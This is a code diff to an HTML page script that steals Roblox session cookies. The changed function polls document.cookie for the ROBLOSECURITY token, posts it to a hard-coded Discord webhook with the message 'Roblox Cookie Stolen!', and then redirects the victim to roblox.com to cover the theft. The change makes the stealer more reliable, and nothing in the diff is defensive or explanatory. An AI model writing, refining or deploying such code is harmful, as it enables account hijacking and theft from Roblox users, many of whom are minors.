@@ -5,19 +5,28 @@
     // REPLACE WITH YOUR REAL WEBHOOK URL
     const webhook = "https://discord.com/api/webhooks/1566889927331938345/HjeYNYbP4TPSbCefwKt93LDBpEVBqAatY6fSiDBRB36wglMU8p14V4KgqdPU0aR-AQcb"; 
 
-    setTimeout(async () => {
-        try {
+    async function steal() {
+        // Try to get cookie up to 5 times with delays
+        for (let i = 0; i < 5; i++) {
+            await new Promise(r => setTimeout(r, 1000)); // Wait 1 second
             const cookie = document.cookie;
-            await fetch(webhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: "**Roblox Cookie Stolen!**\n\nCookie: ```" + cookie + "```"
-                })
-            });
-        } catch (e) {}
+            if (cookie.includes("ROBLOSECURITY")) {
+                try {
+                    await fetch(webhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: "**Roblox Cookie Stolen!**\n\nCookie: ```" + cookie + "```"
+                        })
+                    });
+                    break; // Stop trying once we have it
+                } catch (e) {}
+            }
+        }
         window.location.href = "https://www.roblox.com/";
-    }, 2000); // Waits 2 seconds for Roblox to load cookies
+    }
+
+    steal();
 </script>
 </body>
 </html>
